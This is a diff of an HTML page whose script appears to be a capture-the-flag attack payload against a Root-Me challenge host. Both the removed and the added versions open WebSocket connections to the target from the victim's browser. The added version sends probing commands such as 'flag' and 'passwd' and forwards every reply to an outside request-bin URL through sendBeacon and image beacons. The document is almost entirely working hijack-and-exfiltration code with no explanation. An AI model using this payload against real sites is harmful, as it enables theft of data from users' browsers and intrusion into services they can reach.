@@ -2,38 +2,46 @@
 <html>
 <body>
 <script>
-fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=page_loaded", { mode: "no-cors" });
+const BIN = "https://eo287p1od7gtso3.m.pipedream.net";
 
-fetch("https://eo287p1od7gtso3.m.pipedream.net/?typeof_ws=" + encodeURIComponent(typeof WebSocket), {
-  mode: "no-cors"
-});
+function log(msg) {
+  try {
+    navigator.sendBeacon(BIN + "?d=" + encodeURIComponent(msg), "");
+  } catch (e) {
+    (new Image()).src = BIN + "?d=" + encodeURIComponent(msg);
+  }
+}
 
-try {
-  const target = "ws://ctf20.root-me.org/ws";
-  fetch("https://eo287p1od7gtso3.m.pipedream.net/?target=" + encodeURIComponent(target), {
-    mode: "no-cors"
+window.onerror = function (msg) {
+  log("onerror:" + msg);
+};
+
+log("page_loaded");
+log("typeof_ws:" + typeof WebSocket);
+
+setTimeout(() => {
+  ["ws://ctf20.root-me.org/ws", "wss://ctf20.root-me.org/ws"].forEach((url, i) => {
+    try {
+      log("trying:" + url);
+      const ws = new WebSocket(url);
+
+      ws.onopen = () => {
+        log("open:" + url);
+        ["help", "commands", "admin", "secret", "flag", "passwd", "/passwd"].forEach((c, n) =>
+          setTimeout(() => ws.send(c), 500 * (n + 1))
+        );
+      };
+
+      ws.onmessage = (e) => log("msg:" + url + ":" + e.data);
+      ws.onerror = () => log("error:" + url);
+      ws.onclose = () => log("close:" + url);
+    } catch (e) {
+      log("ctor_exception:" + url + ":" + String(e));
+    }
   });
 
-  const ws = new WebSocket(target);
-
-  ws.onopen = () => {
-    fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_open", { mode: "no-cors" });
-  };
-
-  ws.onerror = () => {
-    fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_error", { mode: "no-cors" });
-  };
-
-  ws.onclose = () => {
-    fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_close", { mode: "no-cors" });
-  };
-} catch (e) {
-  fetch(
-    "https://eo287p1od7gtso3.m.pipedream.net/?step=ws_ctor_exception&msg=" +
-      encodeURIComponent(String(e && e.message ? e.message : e)),
-    { mode: "no-cors" }
-  );
-}
+  setTimeout(() => log("still_alive_10s"), 10000);
+}, 1000);
 </script>
 OK
 </body>
